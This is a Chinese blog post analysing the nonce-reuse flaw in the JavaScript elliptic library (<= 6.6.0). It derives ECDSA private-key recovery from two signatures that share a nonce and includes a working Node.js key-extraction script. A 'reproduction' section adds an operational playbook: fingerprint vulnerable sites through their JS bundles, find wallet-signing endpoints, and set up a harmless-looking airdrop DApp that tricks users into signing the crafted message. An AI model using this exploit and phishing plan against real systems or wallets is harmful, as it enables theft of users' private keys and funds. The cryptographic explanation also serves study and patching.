---
layout:     post                       
title:     Elliptic库Nonce重用漏洞分析
subtitle:   
date:       2025-08-20       
author:     Closure                         
header-img: img/0727.jpg
catalog: true                         
tags:                               
    - 笔记
    - 安全
---

### Elliptic库漏洞

https://paulmillr.com/posts/deterministic-signatures

之前披露的这个Elliptic库漏洞的手法我看完了相关研判觉得非常狡猾，它攻击的不是加密算法而是这个程序的异常处理逻辑，没有去硬碰硬破解椭圆曲线，曲线救国找到了代码处理意外情况的薄弱环节。整个攻击的核心是先故意触发一次失败的签名，发送一个一个超出范围的哈希值来导致 sign() 函数在生成了独一无二的随机数 k 之后还没来得及完成签名就抛出了异常。状态未重置的致命疏忽就是这个漏洞的关键点，程序在捕获异常后没有将用于生成 k 的内部状态重置。类似像一个准备好的一次性印章(?)墨已经蘸好了但是因为纸张不对就没有盖下去，但是这个蘸好墨的印章没被销毁而是被放回了。攻击者紧接着发送一个正常的消息，此时sign() 函数再次启动，未重置的状态，生成了与上一次失败尝试中一模一样的随机数 k和成功完成签名。

攻击者就这样轻松获得了用同一个 k 签名的两个不同消息，通过简单的数学公式解出私钥。

> inputs: d is a private key, m is a message to sign
> functions: rand produces secure randomness, hash creates cryptographic hash, combine is HMAC-DRBG
> operations: G × k is elliptic curve scalar multiplication with G=generator point, || is byte concatenation, ⋅ is multiplication, mod n is modular reduction n=curve order
> ECDSA:

> k = rand() // a: random
> k = combine(d, m) // b: deterministic, RFC 6979
> R = G × k
> r = R.x mod n
> s = k^-1 ⋅ (m + d⋅r) mod n
> sig = r || s
> Schnorr from BIP340:

> A = G × d
> t = d ^ hash(rand())
> k = hash(t || A || m) mod n
> R = G × k
> e = hash(R || A || m) mod n
> s = (k + e⋅d) mod n
> sig = R || s
> EdDSA ed25519 from RFC 8032:

> h = hash(d)
> d_ = h[0..32]
> t = h[32..64]
> A = G × d_
> k = hash(t || m)
> R = G × k
> e = hash(R || A || m)
> s = (k + e⋅d_) mod n
> sig = R || s
> Extracting keys using bad randomness

> Before deterministic signatures became popular, signatures were produced with randomness. Every time anyone signed anything, a random sequence of bytes k (also known as “nonce”) was generated. Then, k was used to produce a signature:

> k = rand()
> However, “random generation of k” is non-trivial task. In short, k must always be unpredictable and not previously used. This could be achieved using “cryptographically secure random” (CSPRNG).

> What if randomness is predictable?
> Methods like Math.random() are predictable - in JS, CSPRNG getRandomValues should be used instead. Think of predictable generators as fn(currTime): if you know state (currTime) before values are generated, you could easily re-generate those. Predictable nonce k allows an attacker to extract private key from the signature, which happened with Sony PS3:

> d = (r^-1)(s⋅k-m) mod n
> What if randomness is reused?
> Reusing random nonce k allows attacker to extract private keys from two distinct signatures:

> s = (k^-1)⋅(m+r⋅d) mod n
> s1-s2 == k^-1⋅(m1-m2)
> k(s1-s2) == m1-m2 // mul both by k
> k = ((s1-s2)^-1)⋅(m1-m2) // mul both by (s1-s2)^-1
> s1 = (k^-1)(m1+r⋅d)
> r⋅d == s1⋅k-m1
> d = (r^-1)⋅(s1⋅k-m1) // mul both by r^-1
> // where r, s1, s2 are r, s from sigs 1, 2;
> // all operations are mod n
> After that, people invented and popularized deterministic signatures.

[这里](https://github.com/indutny/elliptic/security/advisories/GHSA-vjh7-7g9h-fjfh "这里")披露了在广泛使用的JavaScript elliptic密码学库中存在一个严重级别的安全漏洞，漏洞的通用漏洞评分系统评分为 9.0和存在于所有版本   <= 6.6.0 的 elliptic 库中，它允许远程攻击者通过提交一个经过特殊构造的恶意消息，仅需一次签名操作就可以计算并窃取服务器的私钥。如上述说的根本原因在于椭圆曲线数字签名算法实现中的一个致命缺陷即nonce 重用。在特定条件下，库的内部逻辑会因对输入消息类型处理不当为两个不同的消息生成完全相同的 nonce，一旦发生 nonce 重用就可以利用公开的签名信息和简单的代数运算直接反解出签名所用的私钥。

椭圆曲线数字签名算法ECDSA是一种高效广泛应用的数字签名方案，在ECDSA签名过程中，有一个临时参数nonce，通常用变量 k 表示。Nonce是一个秘密的且只使用一次的数字，在每次生成签名时，算法都必须生成一个全新的不可预测的并且绝不重复使用的 nonce k。这个k值会与私钥和待签名的消息哈希一同参与数学运算，最终生成签名结果。

ECDSA的安全性在数学上强依赖于nonce k 的唯一性和保密性，如果同一个私钥在对两个不同的消息进行签名，也就是使用了相同的nonce k，那么整个密码系统的安全性将瞬间虚无。原理就是攻击者如果获得了这两条不同消息的签名结果就可以建立一个包含私钥的联立方程组，由于两条签名共享了同一个未知的nonce k，攻击者可以通过简单的代数消元法将 k 从方程中消除，从而直接解出唯一的私钥。  

### 攻击实践

攻击的实施需要满足一个前提，攻击者必须事先知道一个由目标私钥生成的有效签名以及该签名对应的原始消息，这个前提在许多现实场景中是完全可能满足的，例如公共区块链，类似比特币、以太坊等区块链上的所有交易和签名都是公开的，攻击者可以轻易地从链上获取大量的对，还有公开声or软件签名和交互式协议。

一旦满足此前提就可以展开攻击了。

1.获取已知样本：攻击者选定一个目标，并获取其签名过的一对数据 (m_0, (r_0, s_0))。

2.构造恶意消息：攻击者基于 m_0 构造一个新的、类型不同的消息 m_1，根据漏洞原理，最简单的方法是将 m_0 的字节内容转换为十六进制字符串。

3.诱导签名：攻击者通过某种方式，将恶意消息 m_1 提交给受害者的签名系统，并诱使其使用目标私钥进行签名。这可以通过多种途径实现，例如在一个 Web3 应用中，诱导用户签署一个特殊构造的交易。

4.向一个接受外部输入并进行签名的API端点发送一个精心构造的请求。

5.在任何允许用户提供待签名数据的场景中植入 m_1。

6.获取第二个签名：受害者的系统接收到字符串类型的 m_1，并调用了存在漏洞的 elliptic.js 库的 sign 函数，由于类型歧义库内部生成了与签署 m_0 时完全相同的临时密钥k。系统返回一个新的签名 (r_1, s_1)。由于 k 相同必然有 r_1 = r_0。

7.提取私钥。

8.两条不同的消息：m_0 (Buffer) 和 m_1 (string)。

9.对应的两个签名：(r_0, s_0) 和 (r_1, s_1)，其中 r_0 = r_1。

10.将 m_0 和 m_1 哈希后得到密码学意义上的消息摘要h_0和h_1。

11.攻击者随即应用 3.1 节中推导出的私钥恢复公式，计算出私钥d。

[poc在这里](https://github.com/indutny/elliptic/security/advisories/GHSA-vjh7-7g9h-fjfh "poc在这里")

```
// 1. 准备环境和已知签名
const privateKey = crypto.getRandomValues(new Uint8Array(32)); // 目标私钥
const ec = new EC('secp256k1');
const msg0 = crypto.getRandomValues(new Uint8Array(32)); // 原始消息 (Buffer)
const sig0 = ec.sign(msg0, privateKey); // 获取已知签名 (r0, s0)

// 2. 构造恶意消息并诱导签名
const msg1 = funny(msg0); // funny() 是一个将 Buffer 转换为等效字符串的函数
const sig1 = ec.sign(msg1, privateKey); // 获取第二个签名 (r1, s1)

// 3. 提取私钥
const restoredKey = extract(msg0, sig0, msg1, sig1, curve); // extract() 实现了私钥恢复算法

// 4. 验证结果
console.log('Keys equal?', Buffer.from(privateKey).toString('hex') === restoredKey);
// 输出: Keys equal? true
```

msg0和sig0代表攻击者已知的公开信息，上面的funny(msg0) 函数的作用是构造出与 msg0 在密码学上等效但在 JavaScript 类型上不同的 msg1，ec.sign(msg1, privateKey) 模拟了受害者系统被诱导签名的过程。

PoC 对ed25519曲线的说明由于其曲线参数的特性恢复出的私钥可能与原始私钥在字节上不完全相同但它们在模N的意义下是等价的，所以使用恢复出的私钥进行签名将产生与使用原始私钥完全相同有效的签名，就算是字节表示可能不同攻击者依然获得了完全等效的签名能力。

### 复现脚本

传统redteam更侧重于网络层&基础设施&常见Web漏洞，elliptic漏洞这个是更隐蔽的攻击平面，是应用逻辑与密码学实现之间的接口。当一个系统接受外部输入并将其用于核心安全操作时，最大的弱点往往不是密码学算法本身，而是输入数据在进入算法前的预处理阶段。

以下内容不构成建议。。。

可以爬一下目标站的js包来找找elliptic的指纹，分析package.json yarn.lock 文件是否低于 6.6.1。然后找进行web3常用的签名功能点，像使用钱包登录 确认交易 签署消息 授权操作这些，再寻找公开的签名样本。

确定了目标和入口点下一步就是获取基础样本 m₀, sig₀，从侦察阶段找到一个已知的由目标私钥签名的消息 m₀和对应的签名 sig₀，再构造恶意消息m₁，写个简单的脚本，将m₀的字节内容转换成一个在Js中类型不同但经elliptic库处理后结果相同的格式。最后准备私钥恢复脚本，就根据之前提到的数学原理准备写一个脚本。

如果目标是一个API就构造一个包含 m₁的json请求体然后发送，在web3场景中可以设计一个看似无害的DApp前端来诱导用户连接钱包并签署一个由m₁构成的消息来验证身份和领空投。

一旦sig₁到手就拥有了完成攻击的所有东西，运行恢复脚本输入 m₀, sig₀, m₁, sig₁就可以得到目标私钥。  

node.js脚本

```
const crypto = require('crypto');
const { ec: EC } = require('elliptic');
const BN = require('bn.js');

const CURVE_NAME = 'secp256k1';

function createMalformedMessage(msgBuffer) {
  return msgBuffer.toString('hex');
}

function extractPrivateKey(msg0, sig0, msg1, sig1, ec) {
  
  const n = ec.n;

 
  const r = sig0.r;
  const s0 = sig0.s;
  const s1 = sig1.s;

  const h0 = new BN(ec.hash().update(msg0).digest(), 16);
  const h1 = new BN(ec.hash().update(msg1).digest(), 16);

  const s_delta = s0.sub(s1).umod(n);
  const h_delta = h0.sub(h1).umod(n);
  const k = h_delta.mul(s_delta.invm(n)).umod(n);

  const r_inv = r.invm(n);
  const sk = s0.mul(k).sub(h0).umod(n);
  const privateKey = sk.mul(r_inv).umod(n);

  return privateKey.toString('hex');
}


function simulateAttack() {
  console.log(`[+]`);
  const ec = new EC(CURVE_NAME);

  const victimKeyPair = ec.genKeyPair();
  const victimPrivateKey = victimKeyPair.getPrivate('hex');
  console.log(`\n---环境 ---`);
  console.log(`私钥: ${victimPrivateKey}`);

  const m0_originalMessage = crypto.randomBytes(32);
  const sig0_knownSignature = victimKeyPair.sign(m0_originalMessage);
  console.log(`\n--- ---`);
  console.log(`已知的公开消息 (m₀): ${m0_originalMessage.toString('hex')}`);
  console.log(`已知的公开签名 (sig₀): r=${sig0_knownSignature.r.toString('hex').slice(0, 20)}...`);

  const m1_maliciousMessage = createMalformedMessage(m0_originalMessage);
  console.log(`\n--- 2 ---`);
  console.log(`(m₁): ${m1_maliciousMessage.slice(0, 40)}...`);
  console.log(`: ${typeof m1_maliciousMessage}`);

  const sig1_leakedSignature = victimKeyPair.sign(m1_maliciousMessage);
  console.log(`\n--- 3---`);
  console.log(``);

  const isNonceReused = sig0_knownSignature.r.eq(sig1_leakedSignature.r);
  console.log(`[!]  (r₀ === r₁): ${isNonceReused}`);
  if (!isNonceReused) {
    console.error("[-] ");
    return;
  }
  console.log("[+] ");


  const recoveredPrivateKey = extractPrivateKey(
    m0_originalMessage,
    sig0_knownSignature,
    m1_maliciousMessage,
    sig1_leakedSignature,
    ec
  );
  console.log(`\n--- 4---`);
  console.log(`恢复出的私钥: ${recoveredPrivateKey}`);

  const isSuccess = (victimPrivateKey === recoveredPrivateKey);
  console.log(`\n[!]`);

  if (isSuccess) {
    console.log("\n ");
  }
}


simulateAttack();
```



